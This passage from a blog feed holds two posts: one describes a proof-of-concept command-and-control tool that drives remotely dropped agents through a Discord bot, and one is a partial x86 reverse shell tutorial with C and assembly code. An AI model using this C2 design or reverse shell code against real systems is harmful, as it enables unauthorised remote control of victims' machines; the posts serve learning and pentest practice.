  &lt;li&gt;‘Devs’ can create bots to automate certain features &amp;lt;- &lt;em&gt;interesting&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Although a user can create a ’server’ they don’t host anything themselves&lt;/li&gt;
  &lt;li&gt;Multiple clients are available, all using their API to have seamless cross platform &amp;lt;- &lt;em&gt;also interesting&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Okay, so if you haven’t spotted something we could do already by my interesting hints, then let’s run through a brief possible approach:&lt;/p&gt;

&lt;p&gt;As we, the attacker, want to be able to issue commands to an agent on a remote system we can utilise the Discord client on the attacking system to send messages. We now want something to ‘receive’ those messages, the easiest approach would be to have a human on the other end - however, this isn’t a thing, so instead we want to create a bot to read the messages and react appropriately. So now we have a simple agent that should be able to receive a message and easily send a reply. We will want to utilise the Discord API to send and receive messages within our agent. Finally, we want to use a new ‘server’ created by us to ensure our messages don’t get ‘lost’ or our agents don’t get confused due to other users or a high amount of messages being thrown around.&lt;/p&gt;

&lt;p&gt;The above should give us a low quality implementation (v0.1 if you will). The rest of the post will be following a structure similar to the above, effectively breaking up each chunk of the project and explaining what I did to implement a working PoC. The final product (or as it currently stands) went a pretty big step further than the above. That will be covered towards the end (it’s pretty cool and probably my favourite bit).&lt;/p&gt;

&lt;h2 id=&quot;creating-our-agent-and-making-our-initial-poc&quot;&gt;Creating our agent and making our initial PoC&lt;/h2&gt;
&lt;p&gt;First things first, I needed to create an ‘agent’ executable that would be dropped on a target system. I used the discordgo (https://github.com/bwmarrin/discordgo) to hook into the API, without this project I wouldn’t have gotten anywhere near where I did in the short amount of time - so big thanks!! The agent now acted like a Discord bot, when it was executed it would log in to the Discord service and sit and wait. So far, so good. Oh I forgot to mention, before getting a bot to authenticate properly you need to go to the developer portal for Discord and create an ‘app’ followed by a ‘bot’. This will give you an authentication token which is used to successfully authenticate and bring your bot to life. Simple, but pretty important. Once you have this, add your bot to a server you want to use (I created a new one so it was just my bot and my personal account). In theory, you now have your means of communication between an agent and you (the attacker).&lt;/p&gt;

&lt;p&gt;So now I had an agent that did nothing. Strong start. But what do agents need to do? Well… anything really. I set up a listener that would fire off a function everytime a message was received in the server, and had the bot parse it. For now, the parser would just ‘assume’ that the message contained a system command and used the content of the message in a separate function, executing the command in the underlying OS. For arguments sake, I wrote this entire project in Mac OSX so in any examples I will be using Unix commands. Naturally, Go can be built to many different platforms so Windows (for example) could be done easily, in-fact it might exist in the project at the time of reading this - but it didn’t at the time of writing. Anyway, running the agent and sending the message ‘id’ from my personal Discord account would cause the agent to react and reply with the command output - listing my current system user and its groups, etc. Awesome, I have an agent that receives instructions from a fake C2. At this point, I thought “This is a working PoC of using Discord as a method of communication… done, right?” but my fear of being judged on Twitter (lel) beat me into a corner so I wanted to build something much cooler.&lt;/p&gt;

&lt;p&gt;After a couple of hours of DnB and dev, the basic ‘manual’ message building had become something I was really happy with.&lt;/p&gt;

&lt;p&gt;Now, ultimately, I don’t like Discord. I think it’s awful, the client is meh and no one wants to have to sit in a glorified text box all day. Especially when we have terminals that do everything for us. The best solution is to just uninstall Discord and write a cli tool that does everything for us. I mean, we have the API bindings, a ‘dedicated’ server and a means of authenticating right? So why do we need all the extra crap that Discord comes with… short answer; we don’t.&lt;/p&gt;

&lt;p&gt;I think videos and pictures are worth way more than words so I will drop a video of the C2 and agent working together and then break down each feature I have implemented since the Twitter fear kicked in. Fun fact, I have shown this to a few people so far and they love it. I can’t wait for strangers to hate it and give me grief - it’s what we all live for right? RIGHT?! Anyway, here’s the video from the C2 point of view:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/MhxrTKcTwDANV3IbWiUo2CpVM&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/MhxrTKcTwDANV3IbWiUo2CpVM.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So, as we can see, it’s quite a bit more than the initial implementation and plan. We now have the following features:&lt;/p&gt;

&lt;p&gt;A single discord bot is used for the C2 and the agents.&lt;/p&gt;

&lt;p&gt;Agents have unique ID’s assigned during initialisation. This allows multiple agents to be used and communicate at the same time. With targetted interaction, the correct agent will react/respond every time.&lt;/p&gt;

&lt;p&gt;All messages are chunks of base64 (secure, I know /flex - remember when I said this isn’t engagement ready? I wasn’t lying). These chunks of base64 are encoded JSON structures that hold various information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;data body (target command, required data for task/job, command result etc)&lt;/li&gt;
  &lt;li&gt;To / From ID’s so the server/agents know when to react/ignore messages&lt;/li&gt;
  &lt;li&gt;Message ’type’ used when parsing to figure out the required steps&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The discord server becomes quite busy during communication, as expected. An example of the agent and server communicating via the Discord server can be seen in here:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DaaC2/discord_1.png&quot; alt=&quot;Discord communication&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ‘uname’ example shown in the screenshot below was completed using the following two messages sent to the agent and back to the server:&lt;/p&gt;

&lt;p&gt;From the server:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;FromServer&quot;:true,&quot;ToID&quot;:&quot;bNuHqEb4&quot;,&quot;FromID&quot;:&quot;SERVER&quot;,&quot;MessageType&quot;:&quot;cmd&quot;,&quot;Data&quot;:&quot;uname&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the agent:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;FromServer&quot;:false,&quot;ToID&quot;:&quot;&quot;,&quot;FromID&quot;:&quot;bNuHqEb4&quot;,&quot;MessageType&quot;:&quot;reply&quot;,&quot;Data&quot;:&quot;Darwin\n&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DaaC2/server_3.png&quot; alt=&quot;Commands sent to Agent&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Agents can inject raw shellcode into themselves (upgrade the shell, start a new process, do whatever). Initially I used cgo to perform this but I had a mare when it came to cross compiling. Apparently after a billion years of coding I still don’t know how to build projects properly so I just changed my implementation. It currently only works on Unix/Darwin, not Windows.&lt;/p&gt;

&lt;p&gt;Agents have a heartbeat and ping the server every minute (can be set to whatever value you want in the source) allowing the server to track which agents are alive and dead. These can be listed in a table, showing their ID’s for easy interaction. There is some form of persistence here, whereby the server checks if it knows about the pinging agent and adds it back to the server list for interaction if it has ‘forgotten’ about it. This would be handy if the server ever died and was relaunched as the agents would be able to let them know they are still alive (this should use some form of secret/token so a rogue agent couldn’t connect through to us if it was able to get the auth token from the Discord bot). An example heartbeat message structure can be seen below (decoded). In addition, the heartbeat can be see in the screenshot above - rendered in yellow:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;FromServer&quot;:false,&quot;ToID&quot;:&quot;&quot;,&quot;FromID&quot;:&quot;bNuHqEb4&quot;,&quot;MessageType&quot;:&quot;ping&quot;,&quot;Data&quot;:&quot;Ping at: 2020-01-25 19:38:54.466929 +0000 GMT m=+61.316731943&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are different cli menu states, allowing for easy message building and specific agent interaction. In addition, help menus can be listed per state to see the different options available:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DaaC2/server_2.png&quot; alt=&quot;Help menu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All known agents can be listed in a table within the cli, showing information such as the hostname, the systems external facing IP, their OS (very buggy) and their agentID for easy interaction. This is shown below, when issuing the ‘agents’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DaaC2/server_1.png&quot; alt=&quot;Lising the connected agents&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Agents can be killed by the server on request, removing them from the server and shutting down the process on the target; however, executable will still remain on the system. This can be seen in the following screenshot, issuing the ‘kill’ option whilst interacting with an Agent.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/DaaC2/server_4.png&quot; alt=&quot;Killing the target agent&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I haven’t dived into each of the above too much as hopefully the video shows it all off and as the source is available (https://github.com/crawl3r/DaaC2) - you can dive in and see what you can figure out. If you have any questions, suggestions or want me to cover each of the features more, tweet me and I can sort something out.&lt;/p&gt;

&lt;p&gt;Finally, I am likely going to continue developing this as I really enjoyed the couple of hours I spent making it. I think with more time, it could grow pretty nicely. So far, I haven’t spent any time implementing methods of evading AV or trying to hide on the target system so it is likely that it will get caught or flagged almost instantly. So you know, be smart. Don’t be a skid like me.&lt;/p&gt;

&lt;p&gt;Thanks for checking out my current project, hope you like it. If not, cool - I’m sure you can do miles better, right? Send it me when you have &amp;lt;3&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Introduction It was a cold Sunday evening, and I was doing nothing but afk’ing cannonballs on OSRS (shout out to @TimGMichaud) when I had an urge to make something. I was thinking about a conversation I had on Friday with Sion (fellow colleague/hacker friend) about methods of dropping malware, communicating with C2’s, how implants go undetected but still communicate etc. I fired up VS code and built a skeleton project of a ‘client’ and a ‘server’. I immediately took a step back and thought ‘I have already made stuff using the common approach (http/https, GET/POST etc).’ I wanted to make something I hadn’t seen before as well as something that was brand new to me. It was then I thought about using Discord as my means of communication between a server (C2) and a client (agent). Short(ish) Disclaimer I don’t write Malware for a living, I am not a red teamer (I work as a pentester) so I don’t have a tonne of knowledge in this area. When I build a C2/agent I pretty much get it working to a point where I can use it to gain a foothold and then upgrade/migrate to something a bit more substantial (i.e meterpreter etc). I do however, have a big interest in malware, agents, implants, etc so I do enjoy writing little tools and PoC’s to scratch an itch. What you see here is no where near ‘production’ ready. I doubt it would be useful on site or in an engagement but hopefully it covers an area which hasn’t been discovered or hopefully it helps you, the reader, to build your own or even discover how wonderful Go is to write in. Don’t get triggered, I write things in a tonne of languages, Go just happens to be my current flavour at the moment. Use whatever you guys want, as long as you can bypass basic detection then you’re off to a good start. Planning Before I started implementing anything, I needed to figure out what I need to get a working PoC and how I might go about it. First things first, how am I going to use Discord as a method of communication. What we know about Discord (basic, high level approach): Basically Skype but targetting gamers Any user can create a ‘server’ (something something vent) ‘Devs’ can create bots to automate certain features &amp;lt;- interesting Although a user can create a ’server’ they don’t host anything themselves Multiple clients are available, all using their API to have seamless cross platform &amp;lt;- also interesting Okay, so if you haven’t spotted something we could do already by my interesting hints, then let’s run through a brief possible approach: As we, the attacker, want to be able to issue commands to an agent on a remote system we can utilise the Discord client on the attacking system to send messages. We now want something to ‘receive’ those messages, the easiest approach would be to have a human on the other end - however, this isn’t a thing, so instead we want to create a bot to read the messages and react appropriately. So now we have a simple agent that should be able to receive a message and easily send a reply. We will want to utilise the Discord API to send and receive messages within our agent. Finally, we want to use a new ‘server’ created by us to ensure our messages don’t get ‘lost’ or our agents don’t get confused due to other users or a high amount of messages being thrown around. The above should give us a low quality implementation (v0.1 if you will). The rest of the post will be following a structure similar to the above, effectively breaking up each chunk of the project and explaining what I did to implement a working PoC. The final product (or as it currently stands) went a pretty big step further than the above. That will be covered towards the end (it’s pretty cool and probably my favourite bit). Creating our agent and making our initial PoC First things first, I needed to create an ‘agent’ executable that would be dropped on a target system. I used the discordgo (https://github.com/bwmarrin/discordgo) to hook into the API, without this project I wouldn’t have gotten anywhere near where I did in the short amount of time - so big thanks!! The agent now acted like a Discord bot, when it was executed it would log in to the Discord service and sit and wait. So far, so good. Oh I forgot to mention, before getting a bot to authenticate properly you need to go to the developer portal for Discord and create an ‘app’ followed by a ‘bot’. This will give you an authentication token which is used to successfully authenticate and bring your bot to life. Simple, but pretty important. Once you have this, add your bot to a server you want to use (I created a new one so it was just my bot and my personal account). In theory, you now have your means of communication between an agent and you (the attacker). So now I had an agent that did nothing. Strong start. But what do agents need to do? Well… anything really. I set up a listener that would fire off a function everytime a message was received in the server, and had the bot parse it. For now, the parser would just ‘assume’ that the message contained a system command and used the content of the message in a separate function, executing the command in the underlying OS. For arguments sake, I wrote this entire project in Mac OSX so in any examples I will be using Unix commands. Naturally, Go can be built to many different platforms so Windows (for example) could be done easily, in-fact it might exist in the project at the time of reading this - but it didn’t at the time of writing. Anyway, running the agent and sending the message ‘id’ from my personal Discord account would cause the agent to react and reply with the command output - listing my current system user and its groups, etc. Awesome, I have an agent that receives instructions from a fake C2. At this point, I thought “This is a working PoC of using Discord as a method of communication… done, right?” but my fear of being judged on Twitter (lel) beat me into a corner so I wanted to build something much cooler. After a couple of hours of DnB and dev, the basic ‘manual’ message building had become something I was really happy with. Now, ultimately, I don’t like Discord. I think it’s awful, the client is meh and no one wants to have to sit in a glorified text box all day. Especially when we have terminals that do everything for us. The best solution is to just uninstall Discord and write a cli tool that does everything for us. I mean, we have the API bindings, a ‘dedicated’ server and a means of authenticating right? So why do we need all the extra crap that Discord comes with… short answer; we don’t. I think videos and pictures are worth way more than words so I will drop a video of the C2 and agent working together and then break down each feature I have implemented since the Twitter fear kicked in. Fun fact, I have shown this to a few people so far and they love it. I can’t wait for strangers to hate it and give me grief - it’s what we all live for right? RIGHT?! Anyway, here’s the video from the C2 point of view: So, as we can see, it’s quite a bit more than the initial implementation and plan. We now have the following features: A single discord bot is used for the C2 and the agents. Agents have unique ID’s assigned during initialisation. This allows multiple agents to be used and communicate at the same time. With targetted interaction, the correct agent will react/respond every time. All messages are chunks of base64 (secure, I know /flex - remember when I said this isn’t engagement ready? I wasn’t lying). These chunks of base64 are encoded JSON structures that hold various information: data body (target command, required data for task/job, command result etc) To / From ID’s so the server/agents know when to react/ignore messages Message ’type’ used when parsing to figure out the required steps The discord server becomes quite busy during communication, as expected. An example of the agent and server communicating via the Discord server can be seen in here: The ‘uname’ example shown in the screenshot below was completed using the following two messages sent to the agent and back to the server: From the server: {&quot;FromServer&quot;:true,&quot;ToID&quot;:&quot;bNuHqEb4&quot;,&quot;FromID&quot;:&quot;SERVER&quot;,&quot;MessageType&quot;:&quot;cmd&quot;,&quot;Data&quot;:&quot;uname&quot;} From the agent: {&quot;FromServer&quot;:false,&quot;ToID&quot;:&quot;&quot;,&quot;FromID&quot;:&quot;bNuHqEb4&quot;,&quot;MessageType&quot;:&quot;reply&quot;,&quot;Data&quot;:&quot;Darwin\n&quot;} Agents can inject raw shellcode into themselves (upgrade the shell, start a new process, do whatever). Initially I used cgo to perform this but I had a mare when it came to cross compiling. Apparently after a billion years of coding I still don’t know how to build projects properly so I just changed my implementation. It currently only works on Unix/Darwin, not Windows. Agents have a heartbeat and ping the server every minute (can be set to whatever value you want in the source) allowing the server to track which agents are alive and dead. These can be listed in a table, showing their ID’s for easy interaction. There is some form of persistence here, whereby the server checks if it knows about the pinging agent and adds it back to the server list for interaction if it has ‘forgotten’ about it. This would be handy if the server ever died and was relaunched as the agents would be able to let them know they are still alive (this should use some form of secret/token so a rogue agent couldn’t connect through to us if it was able to get the auth token from the Discord bot). An example heartbeat message structure can be seen below (decoded). In addition, the heartbeat can be see in the screenshot above - rendered in yellow: {&quot;FromServer&quot;:false,&quot;ToID&quot;:&quot;&quot;,&quot;FromID&quot;:&quot;bNuHqEb4&quot;,&quot;MessageType&quot;:&quot;ping&quot;,&quot;Data&quot;:&quot;Ping at: 2020-01-25 19:38:54.466929 +0000 GMT m=+61.316731943&quot;} There are different cli menu states, allowing for easy message building and specific agent interaction. In addition, help menus can be listed per state to see the different options available: All known agents can be listed in a table within the cli, showing information such as the hostname, the systems external facing IP, their OS (very buggy) and their agentID for easy interaction. This is shown below, when issuing the ‘agents’. Agents can be killed by the server on request, removing them from the server and shutting down the process on the target; however, executable will still remain on the system. This can be seen in the following screenshot, issuing the ‘kill’ option whilst interacting with an Agent. I haven’t dived into each of the above too much as hopefully the video shows it all off and as the source is available (https://github.com/crawl3r/DaaC2) - you can dive in and see what you can figure out. If you have any questions, suggestions or want me to cover each of the features more, tweet me and I can sort something out. Finally, I am likely going to continue developing this as I really enjoyed the couple of hours I spent making it. I think with more time, it could grow pretty nicely. So far, I haven’t spent any time implementing methods of evading AV or trying to hide on the target system so it is likely that it will get caught or flagged almost instantly. So you know, be smart. Don’t be a skid like me. Thanks for checking out my current project, hope you like it. If not, cool - I’m sure you can do miles better, right? Send it me when you have &amp;lt;3</summary></entry><entry><title type="html">x86 TCP Reverse Shell</title><link href="http://localhost:4000/2020-01-12/slae32_tcp_reverse_shell" rel="alternate" type="text/html" title="x86 TCP Reverse Shell" /><published>2020-01-12T00:00:00+00:00</published><updated>2020-01-12T00:00:00+00:00</updated><id>http://localhost:4000/2020-01-12/slae32_tcp_reverse_shell</id><content type="html" xml:base="http://localhost:4000/2020-01-12/slae32_tcp_reverse_shell">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;After writing bind shell, I wanted to learnt how to create a TCP reverse shell using x86. I noticed that a high percentage of code could be taken directly from the TCP bind shell. However I chose to implement this from scratch without copy and pasting in order to confirm my newly learnt instructions and confirm I remembered the previous task of creating a bind shell and the steps taken to complete it.&lt;/p&gt;

&lt;h2 id=&quot;brief-thoughts&quot;&gt;Brief Thoughts&lt;/h2&gt;
&lt;p&gt;During this task I performed similar steps to the bind shell, so to prevent a high amount of repetition within this post I will walk through the code once again however I will only explain specific sections of code that were not discussed during the completion of the TCP bind shell, making sure to cover any new C, system calls, wrapper changes and x86. Overall, I found implementing the reverse shell to be easier than the bind shell - but this may be because I had already written my first file in x86 so now this felt a little easier to work through. I had a little trouble making sure the python wrapper stomped out any NULL bytes, however that will be discussed later on in the post.&lt;/p&gt;

&lt;h2 id=&quot;initial-planning&quot;&gt;Initial Planning&lt;/h2&gt;
&lt;p&gt;Similar to the bind shell, my first steps are to gather the information required to create my reverse shell - making sure I have all the required system call information and any additional documentation required to duplicate a C based reverse shell. The following C code presents the TCP reverse shell solution that I used as my reference:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    // creating our struct for use with socket sys call
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(“127.0.0.1”)
    sa.sin_port = htons(9001);

    // first sys call
    s = socket(AF_INET, SOCK_STREAM, 0);

    // second sys call
    connect(s, (struct sockaddr *)&amp;amp;sa, sizeof(sa));

    // third sys call
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    
    // fourth &amp;amp; final sys call
    execve(&quot;/bin/sh&quot;, 0, 0);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compared to the bind shell, the only new system call we can see here is the connect() function. Before we start, let’s make sure we have all the required information using the same approach as last time:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep connect
#define __NR_connect 362
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/revshell# man 2 connect
&amp;lt;snipped&amp;gt;
SYNOPSIS
       #include &amp;lt;sys/types.h&amp;gt;          /* See NOTES */
       #include &amp;lt;sys/socket.h&amp;gt;

       int connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen);
&amp;lt;snipped&amp;gt;
RETURN VALUE
       If  the connection or binding succeeds, zero is returned.  On error, -1
       is returned, and errno is set appropriately.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now create our table of system calls required for the reverse shell:&lt;/p&gt;

&lt;table class=&quot;mbtablestyle&quot;&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;System Call&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;C Definition&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Return Value&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Syscall Number&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;socket&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int socket(int domain, int type, int protocol);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;File descriptor for the new socket.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;359 (0x167)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;connect&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;362 (0x16a)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;dup2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int dup2(int oldfd, int newfd);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;63 (0x3f)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;execve&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;int execve(const char *pathname, char *const argv[], char *const envp[]);&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;11 (0xb)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;crafting-our-reverse-shellcode&quot;&gt;Crafting our Reverse Shellcode&lt;/h2&gt;
&lt;p&gt;Similar to our bind shell, we first want to create the skeleton of our script. Making sure we have our entry point and clean registers:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global    _start
section .text

_start:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first system call we want to implement into our reverse shell script is the socket(). This was used within our TCP bind shell, and for that reason i won’t be explaining it as much as I did there. The implementation was the same and approach taken reflected that of my second bind shell attempt, preventing any NULL bytes from being in the final payload:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; syscall socket 359 (0x167)
; int socket(int domain, int type, int protocol); - returns fd
mov ax, 0x167       ; sys call number
mov bl, 0x2         ; AF_INET
mov cl, 0x1         ; SOCK_STREAM
; EDX should already be 0 from initial clear up top
    
int 0x80            ; exec syscall
mov edi, eax        ; save the fd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second system call required is new to us, and required a bit of work to get up and running correctly. This call is the connect() system call. Looking at our table above, we can see that we need the following:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;our file descriptor that was returned from socket()&lt;/li&gt;
  &lt;li&gt;a pointer to a sockaddr struct&lt;/li&gt;
  &lt;li&gt;the size of this sockaddr struct in memory&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As previously researched, the sockaddr struct contains the following data (taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in {
    short sin_family; // e.g. AF_INET
    ‏)3490(unsigned short sin_port; // e.g. htons
    struct in_addr sin_addr; // see struct in_addr, below 
    char sin_zero[8]; // zero     this if you want to
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So now we have our struct definition, we want to include the following information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;AF_INET (2)&lt;/li&gt;
  &lt;li&gt;The port number (I used 9001 - 0x2329)&lt;/li&gt;
  &lt;li&gt;The address (127.0.0.1 as we are listening locally)&lt;/li&gt;
  &lt;li&gt;0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before walking through our implementation, we need to address the fact that the target IP address (in this case) will contain two separate 0’s, which will result in NULL bytes existing in our payload. This can be addressed in various ways, for example, h0mbre_ pushed a value into the target address and subtracted another value from it - resulting in the target value without hardcoding any 0 values. For my approach, I zeroed the register and then moved single bytes into the target areas of the register using the ‘mov byte’ instruction. I found this was also used in a NULL byte free reverse shell online at https://packetstormsecurity.com/files/154374/Linux-x86-TCP-Reverse-Shell-127.0.0.1-Nullbyte-Free-Shellcode.html. The following snippet shows my implementation and how I created my data struct, along with my target IP address (127.0.0.1) without any NULL bytes existing.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; create our struct
xor ecx, ecx
push ecx
mov byte [esp], 0x7f      ; now esp is: 0x0000007f
mov byte [esp+3],0x01     ; now esp is 0x0100007f
push ecx
push word 0x2923          ; port 9001
push word 0x2             ; AF_INET
mov ecx, esp              ; set the 2nd param to equal a pointer to our struct
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see above, ECX is XOR’d and pushed onto the stack (resulting in 0x00000000), we then move the value 127 (0x7f) into the lowest part of the address, followed by another move byte instruction which places the value 1 (0x1) into the highest part of the register, finally resulting in 0x0100007f - this now means the current value on the top of our stack is our local IP address, 127.0.0.1. We then complete our data struct by pushing our port number and value for AF_INET onto the stack.&lt;/p&gt;

&lt;p&gt;Now we have our completed data struct in memory, we can implement our connect system call with each parameter correctly set ready for execution. This can seen in the following snippet:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; syscall connect 362 (0x16a)
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
xor eax, eax
mov ax, 0x16a
mov ebx, edi                     ; our backed up fd from socket()

; create our struct
xor ecx, ecx
push ecx
mov byte [esp], 0x7f             ; now esp is: 0x0000007f
mov byte [esp+3],0x01            ; now esp is 0x0100007f
push ecx
push word 0x2923                 ; port 9001
push word 0x2                    ; AF_INET
mov ecx, esp                     ; set the 2nd param to equal a pointer to our struct

xor edx, edx
mov dl, 16                       ; size of struct
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To quickly cover the above snippet, we start off by XOR-ing our EAX register before placing the syscall value 362 (0x16a) into the lower half of the register. Remember, we use AX instead of EAX to remove any NULL bytes in the final payload. We place the value returned by our socket() system call in our 1st parameter (EBX) before crafting our sockaddr struct. Once created and placed on the stack, as described before, we move the current value of our ESP register (pointer to the top of the stack) into our second parameter (ECX). This now satisfies the pointer requirement, described in our initial analysis of the connect system call. Finally, we xor our 3rd parameter register (EDX) and move the value 16 into the lower half of the register, stating the size of the struct. The system call is now ready to execute with the ‘int 0x80’ instruction.&lt;/p&gt;

&lt;p&gt;We now need to call dup2() three times to set up our pipes for our final shell. Originally, in the implementation of the bind shell, I implemented three separate chunks of instructions to perform the system call with the correct parameter values. In my second draft I changed this to use a loop, decrementing the counter each time before breaking out of the loop. This time around I returned to the three separate chunks of instructions. The main reason was, I forgot how to implement a loop and I didn’t want to look back at my previous asm file for help. So I stuck with the three chunks:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; syscall dup2 - 3 times 63 (0x3f)
; int dup2(int oldfd, int newfd);
xor eax, eax
mov al, 0x3f
mov ebx, edi
xor ecx, ecx
int 0x80                ; first call with 0

xor eax, eax
mov al, 0x3f
mov ebx, edi
mov cl, 0x1
int 0x80                ; second call with 1

xor eax, eax
mov al, 0x3f
mov ebx, edi
mov cl, 0x2
int 0x80                ; third call with 2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I won’t explain this code again, as it is exactly the same as the bind shell. If you are unsure of the implementation above, please check that post.&lt;/p&gt;

